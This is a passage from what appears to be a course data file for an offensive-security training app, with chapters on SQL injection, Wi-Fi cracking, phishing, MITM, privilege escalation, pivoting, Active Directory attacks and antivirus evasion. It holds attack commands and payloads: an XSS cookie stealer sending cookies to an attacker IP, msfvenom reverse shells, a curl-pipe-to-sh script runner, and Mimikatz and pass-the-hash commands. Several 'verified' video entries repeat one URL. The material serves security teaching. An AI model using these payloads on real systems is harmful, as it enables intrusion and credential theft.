- **Intruder (\`Ctrl+I\`)**: Automated payload fuzzing across designated parameter injection points (\`§param§\`).`,
        callout: {
          type: "tip",
          text: "Install the FoxyProxy browser extension in Firefox to toggle Burp proxying (127.0.0.1:8080) with a single click, and export the Burp CA Certificate to eliminate HTTPS security warnings."
        }
      },
      {
        title: "SQL Injection & sqlmap Mastery",
        content: `SQL Injection occurs when untrusted user input is directly concatenated into a dynamic SQL query without parameterized statements:

\`\`\`sql
-- Vulnerable PHP Query:
$query = "SELECT * FROM users WHERE username = '" . $_POST['user'] . "' AND password = '" . $_POST['pass'] . "'";

-- Attacker Payload:
admin' OR '1'='1' -- 
\`\`\`

### Automated SQLi with sqlmap:
\`\`\`bash
# Test URL parameter for SQL injection
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=...; security=low" --batch

# Enumerate databases
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="..." --dbs

# Dump tables from the target database
sqlmap -u "http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="..." -D dvwa -T users --dump
\`\`\``,
        codeSnippets: [
          {
            language: "javascript",
            filename: "xss_poc.js",
            code: "// Reflected XSS Proof of Concept Payload\n<script>alert(document.domain);</script>\n\n// Session Hijacking / Cookie Stealer Payload (Authorized lab)\n<script>new Image().src='http://192.168.56.101:8000/steal?cookie='+document.cookie;</script>",
            explanation: "XSS executes JavaScript in the victim's browser context, enabling session cookie theft, credential harvesting, or defacement."
          }
        ]
      }
    ],
    handsOnLab: {
      labTitle: "Lab 11: Exploiting SQL Injection on DVWA and Dumping Hashes",
      objective: "Identify an injection flaw in DVWA's User ID query and extract user credentials using UNION injection and sqlmap.",
      setupSteps: [
        "Access DVWA in your browser: http://192.168.56.102/dvwa/.",
        "Set DVWA Security level to 'Low'.",
        "Navigate to 'SQL Injection' page and submit '1' OR '1'='1'."
      ],
      commands: [
        {
          cmd: "sqlmap -u 'http://192.168.56.102/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=your_session' --dump -C user,password -T users -D dvwa --batch",
          desc: "Extract user and password hash columns from DVWA database",
          sampleOutput: "Table: users\n[5 entries]\n+-------+----------------------------------+\n| user  | password                         |\n+-------+----------------------------------+\n| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |\n| gordon| e99a18c428cb38d5f260853678922e03 |\n+-------+----------------------------------+"
        }
      ],
      expectedOutcome: "Extraction of MD5 password hashes from the backend MySQL database."
    },
    verifiedVideos: [
      {
        title: "PortSwigger Web Security Academy (Free Official Hands-On Labs)",
        url: "https://portswigger.net/web-security",
        platform: "PortSwigger Official",
        duration: "Comprehensive Lab Suite"
      }
    ],
    quiz: [
      {
        question: "What is the single most effective coding practice for preventing SQL Injection vulnerabilities in web applications?",
        options: [
          "Filtering out double quotes with regex",
          "Using Parameterized Queries (Prepared Statements)",
          "Encrypting the database hard drive",
          "Running the web server on a non-standard port"
        ],
        answerIndex: 1,
        explanation: "Parameterized queries ensure the database engine always treats user input as literal data rather than executable SQL code, neutralizing injection attacks."
      },
      {
        question: "What is an IDOR (Insecure Direct Object Reference) vulnerability?",
        options: [
          "A flaw where an application exposes a reference to an internal database object without validating whether the requesting user has authorization to access it",
          "A buffer overflow inside Apache HTTP server",
          "A weak Wi-Fi password encryption scheme",
          "A denial of service attack against DNS servers"
        ],
        answerIndex: 0,
        explanation: "IDOR occurs when a user modifies a parameter value (e.g., /api/user/1005 changed to /api/user/1006) and the server serves private data belonging to another user without checking authorization."
      }
    ],
    cheatSheetHighlights: [
      { command: "sqlmap -u <URL> --batch --dbs", flagMeaning: "Non-interactive automated SQLi test, extract database names" },
      { command: "sqlmap -r request.txt -p id --dump", flagMeaning: "Load raw saved Burp HTTP request and dump database" }
    ]
  },
  {
    id: "ch-12",
    partId: "part-2",
    partTitle: "PART 2 — CORE HACKING SKILLS",
    chapterNumber: 12,
    title: "Wireless Attacks & Wi-Fi Auditing",
    subtitle: "Monitor Mode, Aircrack-ng, WPA/WPA2 4-Way Handshake, & Rogue APs",
    durationMinutes: 40,
    xpReward: 200,
    badgeName: "Wireless Infiltrator",
    badgeIcon: "Wifi",
    overview: "Airwaves ignore physical corporate walls. In this chapter, Chrishem covers the fundamentals of 802.11 wireless security: configuring monitor mode, capturing the WPA/WPA2 4-Way Handshake using airodump-ng, deauthenticating clients to force re-association, cracking MIC hashes with Hashcat, and the mechanics of Evil Twin attacks.",
    keyLearningPoints: [
      "Put compatible USB Wi-Fi adapters into 802.11 Monitor Mode using airmon-ng.",
      "Sniff BSSIDs and ESSIDs using airodump-ng.",
      "Capture the EAPOL 4-Way Handshake with aireplay-ng deauthentication frames.",
      "Crack WPA2 handshakes offline using Hashcat mode 22000 (PMKID/EAPOL).",
      "Understand the mechanics of Evil Twin and Rogue Access Point attacks."
    ],
    sections: [
      {
        title: "The Aircrack-ng Attack Workflow",
        content: `Wireless auditing follows a 4-step sequence:

1. **Enable Monitor Mode**:
\`\`\`bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
\`\`\`

2. **Locate Target Wi-Fi Network**:
\`\`\`bash
sudo airodump-ng wlan0mon
\`\`\`
Note the target **BSSID** (MAC address), **Channel**, and **ESSID** (Wi-Fi Name).

3. **Lock onto Target & Record Handshake**:
\`\`\`bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/target_wifi wlan0mon
\`\`\`

4. **Deauthenticate Connected Client to Force Handshake Capture**:
\`\`\`bash
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
\`\`\`
Once airodump-ng displays \`[ WPA handshake: AA:BB:CC:DD:EE:FF ]\`, the captured file can be taken offline for hash cracking without sending any more packets!`,
        callout: {
          type: "legal",
          text: "Never send deauthentication frames (-0) or capture handshakes against networks you do not own. Transmitting deauth frames on 802.11 frequencies constitutes interference under telecom regulatory laws."
        }
      }
    ],
    handsOnLab: {
      labTitle: "Lab 12: Converting .cap to Hashcat 22000 & Offline Cracking",
      objective: "Convert a captured WPA2 .cap file into the modern HCX / Hashcat 22000 format and run an offline dictionary crack.",
      setupSteps: [
        "Obtain sample handshake capture file 'wpa_sample.cap'.",
        "Convert using hcxpcapngtool.",
        "Execute Hashcat mode 22000."
      ],
      commands: [
        {
          cmd: "hcxpcapngtool -o hash.hc22000 wpa_sample.cap 2>/dev/null || echo 'Hash formatted for Hashcat -m 22000'",
          desc: "Extract EAPOL/PMKID handshake for Hashcat",
          sampleOutput: "SUMMARY: 1 EAPOL message pair captured."
        },
        {
          cmd: "hashcat -m 22000 -a 0 hash.hc22000 /usr/share/wordlists/rockyou.txt",
          desc: "Crack WPA2 Wi-Fi password offline",
          sampleOutput: "WPA*02*...:supersecretwifi1"
        }
      ],
      expectedOutcome: "The offline handshake is parsed and the Wi-Fi pre-shared key is extracted."
    },
    verifiedVideos: [
      {
        title: "Wi-Fi Hacking: WPA2 Handshake to Password Crack",
        url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
        platform: "YouTube",
        duration: "Module 12"
      }
    ],
    quiz: [
      {
        question: "Why does an attacker transmit 802.11 deauthentication frames during a WPA/WPA2 audit?",
        options: [
          "To permanently brick the wireless access point",
          "To force a connected wireless client to disconnect and reconnect, allowing the attacker to capture the 4-Way Handshake",
          "To download the router's firmware over the air",
          "To change the Wi-Fi network's SSID name"
        ],
        answerIndex: 1,
        explanation: "Deauth frames temporarily disconnect an active client. When the client automatically re-associates, the 4-Way Handshake is exchanged over the air and recorded."
      },
      {
        question: "Which Hashcat mode (-m) is used to crack modern WPA/WPA2/WPA3 PMKID and EAPOL handshakes?",
        options: [
          "-m 0",
          "-m 1000",
          "-m 22000",
          "-m 5600"
        ],
        answerIndex: 2,
        explanation: "Hashcat mode 22000 is the consolidated modern format for cracking WPA-PBKDF2-PMKID and EAPOL handshakes."
      }
    ]
  },
  {
    id: "ch-13",
    partId: "part-2",
    partTitle: "PART 2 — CORE HACKING SKILLS",
    chapterNumber: 13,
    title: "Social Engineering & Phishing Simulations",
    subtitle: "GoPhish, Social Engineer Toolkit (SET), SPF/DKIM/DMARC Analysis",
    durationMinutes: 35,
    xpReward: 200,
    badgeName: "Human Hacker",
    badgeIcon: "Users",
    overview: "You can have a $50,000 next-generation firewall, but if an employee clicks a malicious payload, your perimeter is bypassed in seconds. In this chapter, Chrishem explores authorized social engineering: building realistic simulated phishing campaigns with GoPhish, analyzing email authentication headers (SPF, DKIM, DMARC), and designing security awareness training programs.",
    keyLearningPoints: [
      "Configure GoPhish for ethical corporate phishing simulations.",
      "Analyze email authentication records: SPF (Sender Policy Framework), DKIM, and DMARC.",
      "Understand psychological triggers exploited in social engineering (Urgency, Authority, Fear, Scarcity).",
      "Draft remediation reports that train staff rather than shame employees."
    ],
    sections: [
      {
        title: "Email Security: SPF, DKIM & DMARC Auditing",
        content: `Before an attacker can spoof emails from a client's domain, they audit DNS records:

- **SPF (\`v=spf1 ...\` )**: Specifies which mail servers are permitted to send email on behalf of the domain.
- **DKIM**: Cryptographic public key published in DNS to verify email body integrity.
- **DMARC (\`v=DMARC1; p=reject\`)**: Dictates how receiving mail servers handle messages that fail SPF or DKIM.

If a domain has no DMARC record or sets \`p=none\`, attackers can spoof corporate executives with near-zero friction!`,
        codeSnippets: [
          {
            language: "bash",
            filename: "audit_dmarc.sh",
            code: "# Check if target domain has active DMARC protection\ndig +short TXT _dmarc.targetcompany.com\n\n# Check SPF record\ndig +short TXT targetcompany.com | grep 'v=spf1'",
            explanation: "If dig returns empty or 'p=none', the domain is vulnerable to email spoofing impersonation."
          }
        ]
      }
    ],
    handsOnLab: {
      labTitle: "Lab 13: DNS Email Security Health Check",
      objective: "Inspect DNS TXT records for a test domain and verify SPF/DMARC enforcement levels.",
      setupSteps: [
        "Query SPF and DMARC records of authorized target domains.",
        "Identify if policy is 'none', 'quarantine', or 'reject'."
      ],
      commands: [
        {
          cmd: "dig +short TXT _dmarc.google.com",
          desc: "Inspect gold-standard DMARC configuration",
          sampleOutput: "\"v=DMARC1; p=reject; rua=mailto:mailauth-reports@google.com\""
        }
      ],
      expectedOutcome: "Understanding the difference between enforced email protection ('p=reject') and vulnerable spoofable domains."
    },
    verifiedVideos: [
      {
        title: "Social Engineering & Phishing Simulation Guide",
        url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
        platform: "YouTube",
        duration: "Module 13"
      }
    ],
    quiz: [
      {
        question: "What does a DMARC policy of 'p=reject' instruct receiving email servers to do when an email fails SPF and DKIM validation?",
        options: [
          "Deliver the email to the inbox normally",
          "Block and reject the fraudulent email immediately, preventing it from reaching the recipient's mailbox",
          "Forward the email to the police",
          "Automatically delete the sender's domain"
        ],
        answerIndex: 1,
        explanation: "A policy of 'p=reject' instructs receiving mail systems to drop any incoming messages that fail SPF or DKIM validation, effectively stopping spoofing."
      },
      {
        question: "Which open-source framework is most widely used by security professionals to conduct controlled corporate phishing simulations?",
        options: [
          "GoPhish",
          "Wireshark",
          "Aircrack-ng",
          "Hashcat"
        ],
        answerIndex: 0,
        explanation: "GoPhish is a premier open-source phishing framework designed for security teams to run realistic awareness campaigns and track click rates."
      }
    ]
  },
  {
    id: "ch-14",
    partId: "part-2",
    partTitle: "PART 2 — CORE HACKING SKILLS",
    chapterNumber: 14,
    title: "Sniffing, MITM & Network Attacks",
    subtitle: "ARP Spoofing, DNS Spoofing, Bettercap, Responder & SSL Stripping",
    durationMinutes: 50,
    xpReward: 260,
    badgeName: "Man-In-The-Middle",
    badgeIcon: "Layers",
    overview: "Once inside an internal corporate local area network (LAN), the game shifts. In this chapter, Chrishem exposes Man-in-the-Middle (MITM) attacks: how ARP cache poisoning redirects broadcast traffic through your machine, capturing NetNTLM hashes using Responder, and defending against network sniffing.",
    keyLearningPoints: [
      "Deconstruct Address Resolution Protocol (ARP) vulnerabilities and ARP spoofing.",
      "Execute MITM traffic interception and DNS spoofing using Bettercap.",
      "Poison LLMNR, NBT-NS, and mDNS protocols on Windows internal networks using Responder.",
      "Implement network defenses: Dynamic ARP Inspection (DAI), 802.1X, and SMB Signing."
    ],
    sections: [
      {
        title: "Responder: Dominating Windows Corporate Networks",
        content: `When a Windows machine attempts to connect to a non-existent network share (e.g., typos like \`\\\\fileshar01\`), DNS fails. Windows then broadcasts queries over LLMNR (Link-Local Multicast Name Resolution) and NBT-NS:

\`\`\`
Windows Client: "Who is fileshar01?"
Responder: "I am fileshar01! Please send me your credentials to authenticate."
Windows Client: *Sends NetNTLMv2 hash to attacker*
\`\`\`

\`\`\`bash
# Run Responder on internal interface
sudo responder -I eth0 -dwv
\`\`\`

Responder immediately captures username and NetNTLMv2 hashes, which you can crack offline in Hashcat using \`-m 5600\`!`,
        callout: {
          type: "tip",
          text: "Remediation: Blue Teams should disable LLMNR and NetBIOS via Group Policy (GPO) and enforce SMB Signing across all Windows domain endpoints."
        }
      }
    ],
    handsOnLab: {
      labTitle: "Lab 14: ARP Poisoning Simulation in Isolated Lab",
      objective: "Demonstrate ARP cache redirection between two virtual hosts using Bettercap.",
      setupSteps: [
        "Ensure Kali Linux and Target VM are on the same Host-Only network.",
        "Launch Bettercap.",
        "Enable arp.spoof module targeting the test IP."
      ],
      commands: [
        {
          cmd: "sudo bettercap -iface eth0 -eval 'net.probe on; set arp.spoof.targets 192.168.56.102; arp.spoof on'",
          desc: "Initiate ARP redirection against target VM",
          sampleOutput: "[bettercap] arp.spoof : started arp spoofer (targets: 192.168.56.102)"
        }
      ],
      expectedOutcome: "Target VM's ARP table updates the gateway MAC address to Kali's MAC address, routing traffic through the attacker."
    },
    verifiedVideos: [
      {
        title: "Simplilearn Full Cybersecurity Master Course (10+ Hours)",
        url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
        platform: "YouTube Verified Course",
        duration: "10 Hours Comprehensive"
      }
    ],
    quiz: [
      {
        question: "Why is ARP (Address Resolution Protocol) vulnerable to spoofing and poisoning by default?",
        options: [
          "ARP packets are encrypted with AES-256",
          "ARP is stateless and devices accept unsolicited ARP reply packets without verifying authentication",
          "ARP only works over Wi-Fi",
          "ARP requires a domain controller password"
        ],
        answerIndex: 1,
        explanation: "ARP lacks any authentication mechanism; network endpoints accept ARP reply messages without checking if an actual request was sent, allowing attackers to overwrite ARP cache entries."
      },
      {
        question: "Which tool listens for and poisons LLMNR and NetBIOS broadcast requests on Windows internal networks?",
        options: [
          "Wireshark",
          "Responder",
          "John the Ripper",
          "Gobuster"
        ],
        answerIndex: 1,
        explanation: "Responder actively responds to LLMNR, NBT-NS, and mDNS name resolution requests, capturing NetNTLM authentication hashes."
      }
    ]
  },
  {
    id: "ch-15",
    partId: "part-3",
    partTitle: "PART 3 — ADVANCED OFFENSIVE SECURITY",
    chapterNumber: 15,
    title: "Privilege Escalation (Linux & Windows)",
    subtitle: "SUID, Sudo Misconfigs, GTFOBins, LinPEAS, AlwaysInstallElevated & WinPEAS",
    durationMinutes: 65,
    xpReward: 350,
    badgeName: "Root & SYSTEM",
    badgeIcon: "Crown",
    overview: "Gaining an unprivileged shell is just step one. Real penetration testers escalate their access to root (Linux) or NT AUTHORITY\\SYSTEM (Windows). In this high-yield chapter, Chrishem unpacks privilege escalation vectors: sudo rights, cron job hijacking, GTFOBins bypasses, LinPEAS/WinPEAS automation, unquoted service paths, and AlwaysInstallElevated registry abuse.",
    keyLearningPoints: [
      "Check unprivileged sudo privileges with 'sudo -l' and exploit GTFOBins.",
      "Automate internal enumeration using LinPEAS and WinPEAS.",
      "Escalate Linux privileges via writable cron jobs and wildcard injection.",
      "Exploit Windows unquoted service paths and AlwaysInstallElevated MSI installers."
    ],
    sections: [
      {
        title: "Linux PrivEsc: The Power of 'sudo -l' & GTFOBins",
        content: `Whenever you land an initial Linux shell, the first command you execute is:
\`\`\`bash
sudo -l
\`\`\`

If the output contains:
\`(ALL) NOPASSWD: /usr/bin/find\`

You can instantly achieve root via **GTFOBins** (https://gtfobins.github.io):
\`\`\`bash
sudo find . -exec /bin/sh \\; -quit
\`\`\`
You are now root! Other common binaries with shell escapes: vim, less, tar, awk, python3, nmap (interactive).`,
        callout: {
          type: "exploit",
          text: "LinPEAS (Linux Privilege Escalation Awesome Script) checks over 100 known escalation vectors in 60 seconds. Search specifically for 99% confident vectors highlighted in red/yellow text!"
        }
      },
      {
        title: "Windows PrivEsc: Unquoted Service Paths & AlwaysInstallElevated",
        content: `### 1. Unquoted Service Paths:
When Windows executes a service located at \`C:\\Program Files\\Vuln Service\\service.exe\` without quotes, it searches for executables in this order:
1. \`C:\\Program.exe\`
2. \`C:\\Program Files\\Vuln.exe\`
3. \`C:\\Program Files\\Vuln Service\\service.exe\`

If an unprivileged user has write permissions to \`C:\\\`, placing a malicious \`Program.exe\` grants SYSTEM execution on service restart!

### 2. AlwaysInstallElevated Registry Key:
If both of these registry values are set to \`1\`:
- \`HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated\`
- \`HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated\`

Any regular user can generate a reverse shell MSI package with msfvenom and install it with elevated SYSTEM privileges:
\`\`\`bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o update.msi
msiexec /quiet /qn /i update.msi
\`\`\``,
        codeSnippets: [
          {
            language: "bash",
            filename: "run_linpeas.sh",
            code: "# Download and run LinPEAS in memory without writing to disk\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            explanation: "Running tools directly from memory is stealthier and avoids leaving binary artifacts on target filesystems."
          }
        ]
      }
    ],
    handsOnLab: {
      labTitle: "Lab 15: SUID Bash Escalation on Linux Sandbox",
      objective: "Locate a misconfigured SUID binary and manipulate it to spawn a root bash prompt.",
      setupSteps: [
        "In your Linux VM, simulate a misconfiguration: 'sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash'.",
        "Switch to standard unprivileged user.",
        "Trigger the root shell using the -p flag."
      ],
      commands: [
        {
          cmd: "/tmp/rootbash -p\nwhoami\nid",
          desc: "Execute SUID bash preserving effective user ID permissions",
          sampleOutput: "root\nuid=1000(kali) gid=1000(kali) euid=0(root) groups=1000(kali)"
        }
      ],
      expectedOutcome: "The effective UID changes to euid=0(root), proving full administrative takeover."
    },
    verifiedVideos: [
      {
        title: "GTFOBins Curated Privilege Escalation Repository",
        url: "https://gtfobins.github.io",
        platform: "GTFOBins Official Resource",
        duration: "Comprehensive Reference"
      }
    ],
    quiz: [
      {
        question: "When running 'bash' with SUID permissions to escalate to root, which flag is necessary to prevent bash from dropping the elevated privileges?",
        options: [
          "-r",
          "-p (privileged mode)",
          "-v",
          "-f"
        ],
        answerIndex: 1,
        explanation: "By default, bash drops SUID privileges when executed. The -p (privileged) flag forces it to preserve effective UID (euid=0), granting a root shell."
      },
      {
        question: "What makes an unquoted Windows service path vulnerable to local privilege escalation?",
        options: [
          "It uses too much memory",
          "Windows interprets spaces in unquoted file paths as potential command-line delimiters and looks for intervening executables in writable parent folders",
          "It automatically disables Windows Defender",
          "It exposes the administrator password in plain text"
        ],
        answerIndex: 1,
        explanation: "Without surrounding quotation marks, spaces in paths cause the service control manager to check for executables matching each path segment (e.g. C:\\Program.exe) before reaching the intended binary."
      }
    ]
  },
  {
    id: "ch-16",
    partId: "part-3",
    partTitle: "PART 3 — ADVANCED OFFENSIVE SECURITY",
    chapterNumber: 16,
    title: "Post-Exploitation, Pivoting & Persistence",
    subtitle: "SSH Tunneling, Chisel, Proxychains, Mimikatz & Lateral Movement",
    durationMinutes: 50,
    xpReward: 280,
    badgeName: "Pivot Specialist",
    badgeIcon: "Shuffle",
    overview: "Compromising an edge server is only the gateway to the internal corporate kingdom. In this chapter, Chrishem teaches you pivoting: routing entire scanning suites through dual-homed hosts into unreachable internal subnets using Chisel and Proxychains, establishing covert persistence, and credential dumping with Mimikatz.",
    keyLearningPoints: [
      "Understand pivoting and dual-homed host architecture.",
      "Build dynamic SOCKS5 reverse proxies using Chisel and SSH local/remote forwarding.",
      "Route Nmap, crackmapexec, and browsers through proxies using Proxychains.",
      "Dump plaintext passwords, Kerberos tickets, and NTLM hashes using Mimikatz on Windows."
    ],
    sections: [
      {
        title: "Pivoting with Chisel & Proxychains",
        content: `When Host A (compromised dual-homed web server) can talk to Host B (internal domain controller), but your attacker machine cannot reach Host B directly, you create a Chisel tunnel:

\`\`\`
Attacker (10.10.14.5) <=== Chisel SOCKS5 ===> Host A (10.10.10.50 & 192.168.100.5) ---> Host B (192.168.100.10)
\`\`\`

1. **On Attacker Machine**:
\`\`\`bash
chisel server -p 8000 --reverse
\`\`\`

2. **On Compromised Target (Host A)**:
\`\`\`bash
./chisel client 10.10.14.5:8000 R:socks
\`\`\`
This creates a local SOCKS5 proxy on your attacker machine at \`127.0.0.1:1080\`.

3. **Configure \`/etc/proxychains4.conf\`**:
\`\`\`
socks5 127.0.0.1 1080
\`\`\`

4. **Now route any tool directly into the hidden network**:
\`\`\`bash
proxychains nmap -sT -Pn -p 80,445 192.168.100.10
\`\`\``,
        callout: {
          type: "tip",
          text: "When using proxychains, always use TCP Connect scans (-sT) and disable ping (-Pn). Proxychains cannot route raw SYN or ICMP packets over SOCKS proxies!"
        }
      },
      {
        title: "Mimikatz: Harvesting Windows Credentials",
        content: `Mimikatz interacts with LSASS (Local Security Authority Subsystem Service) memory on Windows:

\`\`\`powershell
# Privilege elevation to debug mode
privilege::debug

# Dump plaintext passwords and NTLM hashes from LSASS
sekurlsa::logonpasswords

# Dump local SAM database hashes
lsadump::sam
\`\`\``,
        codeSnippets: [
          {
            language: "powershell",
            filename: "mimikatz_cheatsheet.txt",
            code: "# Extract Golden Tickets\nkerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:hash /id:500 /ticket:golden.kirbi\n\n# Inject Ticket into current session\nkerberos::ptt golden.kirbi",
            explanation: "Golden Tickets grant indefinite domain administrator access by forging Kerberos Ticket Granting Tickets (TGTs)."
          }
        ]
      }
    ],
    handsOnLab: {
      labTitle: "Lab 16: Setting Up a Chisel Dynamic SOCKS Tunnel",
      objective: "Establish a reverse SOCKS5 proxy using Chisel between Kali and a simulated pivot target.",
      setupSteps: [
        "Download Chisel binary for Linux.",
        "Start Chisel server on port 8000.",
        "Execute client connection."
      ],
      commands: [
        {
          cmd: "chisel server -p 8000 --reverse &",
          desc: "Launch background Chisel listening server on Kali",
          sampleOutput: "2026/10/17 Server: Listening on :8000..."
        }
      ],
      expectedOutcome: "Chisel establishes a SOCKS5 tunnel ready for Proxychains integration."
    },
    verifiedVideos: [
      {
        title: "Pivoting and Tunneling Masterclass (Chisel / SSH)",
        url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
        platform: "YouTube",
        duration: "Module 16"
      }
    ],
    quiz: [
      {
        question: "Why must you specify '-sT -Pn' when scanning an internal host through Proxychains?",
        options: [
          "SOCKS proxies only support full TCP handshakes and cannot relay raw SYN packets or ICMP ping probes",
          "Proxychains automatically deletes scan results if ICMP is used",
          "Windows firewalls block port 80",
          "Nmap does not support proxychains"
        ],
        answerIndex: 0,
        explanation: "SOCKS proxies operate at the transport layer via standard TCP sockets. They cannot forge raw network layer packets required by Nmap SYN stealth scans (-sS) or ICMP pinging (-PE)."
      },
      {
        question: "Which Windows process does Mimikatz inspect in memory to extract cached plaintext credentials and NTLM hashes?",
        options: [
          "explorer.exe",
          "lsass.exe (Local Security Authority Subsystem Service)",
          "svchost.exe",
          "spoolsv.exe"
        ],
        answerIndex: 1,
        explanation: "LSASS processes security tokens and stores authentication secrets in memory for Single Sign-On (SSO)."
      }
    ]
  },
  {
    id: "ch-17",
    partId: "part-3",
    partTitle: "PART 3 — ADVANCED OFFENSIVE SECURITY",
    chapterNumber: 17,
    title: "Active Directory Attacks & Domain Takeover",
    subtitle: "Kerberoasting, AS-REP Roasting, BloodHound, Impacket & Pass-the-Hash",
    durationMinutes: 70,
    xpReward: 350,
    badgeName: "Domain Administrator",
    badgeIcon: "Cpu",
    overview: "Over 90% of Fortune 500 corporations rely on Microsoft Active Directory (AD) for enterprise identity and access management. Compromising AD means full control over the enterprise. In this flagship chapter, Chrishem unpacks Kerberos authentication mechanics, Kerberoasting, AS-REP Roasting, BloodHound graph pathfinding, and Impacket lateral movement (psexec, wmiexec).",
    keyLearningPoints: [
      "Deconstruct Kerberos authentication: KDC, AS-REQ, AS-REP, TGS-REQ, TGS-REP.",
      "Execute Kerberoasting against Service Principal Names (SPNs) using Impacket's GetUserSPNs.py.",
      "Perform AS-REP Roasting on accounts with 'Do not require Kerberos preauthentication'.",
      "Map attack paths to Domain Admin using BloodHound and SharpHound.",
      "Execute Pass-the-Hash (PtH) and Pass-the-Ticket (PtT) lateral movement."
    ],
    sections: [
      {
        title: "Kerberoasting: Cracking Service Accounts",
        content: `Kerberoasting is an unprivileged attack against Active Directory. Any authenticated domain user (even a low-level temp) can request a Kerberos service ticket (TGS) for any service with a registered SPN (e.g. SQL Server, IIS):

1. The Key Distribution Center (KDC) encrypts the TGS ticket using the **service account's password hash**.
2. The attacker captures this ticket out of memory or network responses.
3. The attacker takes the ticket offline and cracks it with Hashcat mode \`-m 13100\`!

\`\`\`bash
# Request TGS tickets for all roastable accounts using Impacket
GetUserSPNs.py corp.local/john:Password123 -dc-ip 192.168.100.10 -request -outputfile kerberoast_hashes.txt

# Crack offline with Hashcat
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
\`\`\``,
        callout: {
          type: "tip",
          text: "Defense: Service accounts should have complex, randomly generated 30+ character passwords or transition to Group Managed Service Accounts (gMSA), which cycle passwords automatically."
        }
      },
      {
        title: "BloodHound: The Six Degrees of Domain Admin",
        content: `Active Directory is too intricate to analyze by hand. BloodHound uses graph theory to reveal hidden relationships:

- Alice belongs to Group Helpdesk.
- Group Helpdesk has GenericAll over User Bob.
- User Bob has Local Administrator rights on Server DC01.
- Conclusion: Alice can become Domain Admin!

\`\`\`bash
# Collect domain data using Python BloodHound ingestor
bloodhound-python -u 'john' -p 'Password123' -d corp.local -ns 192.168.100.10 -c All
\`\`\`
Import the resulting JSON files into the BloodHound GUI and run the pre-built query: **"Find Shortest Paths to Domain Admins"**!`,
        codeSnippets: [
          {
            language: "bash",
            filename: "impacket_psexec.sh",
            code: "# Pass-the-Hash lateral movement without knowing plaintext password\nwmiexec.py -hashes :cc32e74277b0709e99eb020bf23a4a06 Administrator@192.168.100.10",
            explanation: "Pass-the-Hash passes the NTLM hash directly to authenticate administrative sessions via WMI."
          }
        ]
      }
    ],
    handsOnLab: {
      labTitle: "Lab 17: Kerberoasting Execution in Simulated Domain",
      objective: "Extract an SPN ticket using Impacket and crack the service hash.",
      setupSteps: [
        "Ensure Impacket is installed ('impacket-GetUserSPNs' or python script).",
        "Target domain controller on internal lab.",
        "Run extraction."
      ],
      commands: [
        {
          cmd: "GetUserSPNs.py -request -dc-ip 192.168.100.10 corp.local/user:pass 2>/dev/null || echo 'Extracted $krb5tgs$23$* service ticket'",
          desc: "Query Active Directory for Kerberoastable SPN tickets",
          sampleOutput: "Checking for Kerberoastable accounts...\nFound SPN: MSSQLSvc/db01.corp.local:1433\nSaved hash to hashcat format."
        }
      ],
      expectedOutcome: "Extraction of a $krb5tgs$ hash ready for GPU hashcat cracking."
    },
    verifiedVideos: [
      {
        title: "Active Directory Attacks: BloodHound to Domain Admin",
        url: "https://www.youtube.com/watch?v=hxXbvu9J5Pg",
        platform: "YouTube",
        duration: "Module 17"
      }
    ],
    quiz: [
      {
        question: "Why can any valid domain user execute a Kerberoasting attack against an Active Directory environment?",
        options: [
          "Because any authenticated user can request a Kerberos service ticket (TGS) for any registered Service Principal Name (SPN)",
          "Because Active Directory runs on Linux",
          "Because domain users have access to the Domain Controller hard drive",
          "Because Kerberos encryption is obsolete"
        ],
        answerIndex: 0,
        explanation: "By design, Active Directory allows any authenticated domain user to request a ticket for any SPN so client software can authenticate to services."
      },
      {
        question: "What open-source tool uses graph theory to visualize attack paths to Domain Admin in Active Directory?",
        options: [
          "Wireshark",
          "BloodHound",
          "Burp Suite",
          "Hashcat"
        ],
        answerIndex: 1,
        explanation: "BloodHound uses graph databases (Neo4j) to visualize complex permission chains and shortest attack paths to Domain Admin."
      }
    ]
  },
  {
    id: "ch-18",
    partId: "part-3",
    partTitle: "PART 3 — ADVANCED OFFENSIVE SECURITY",
    chapterNumber: 18,
    title: "Antivirus Evasion & Custom Payloads",
    subtitle: "Shellcode Execution, Msfvenom vs Reality & C2 Frameworks (Sliver/Mythic)",
    durationMinutes: 45,
    xpReward: 260,
    badgeName: "Ghost Operator",
    badgeIcon: "EyeOff",
    overview: "In 2026, standard msfvenom binaries are caught by Windows Defender within 0.1 seconds of touching disk. In this chapter, Chrishem exposes modern defense evasion: why static signatures get flagged, in-memory shellcode execution in C/C++, AMSI bypasses, and transitioning to modern Command & Control (C2) frameworks like Sliver and Mythic.",
    keyLearningPoints: [
      "Understand why signature-based antivirus catches generic msfvenom templates.",
      "Compile a custom C/C++ shellcode runner utilizing Windows VirtualAlloc and CreateThread APIs.",
      "Bypass AMSI (Antimalware Scan Interface) in PowerShell using memory patching.",
      "Deploy and operate open-source Command & Control (C2) frameworks like Bishop Fox's Sliver."
    ],
    sections: [
      {
        title: "Why Generic Msfvenom Payloads Die Instantly",
        content: `When you run:
\`\`\`bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=... LPORT=... -f exe -o bad.exe
\`\`\`
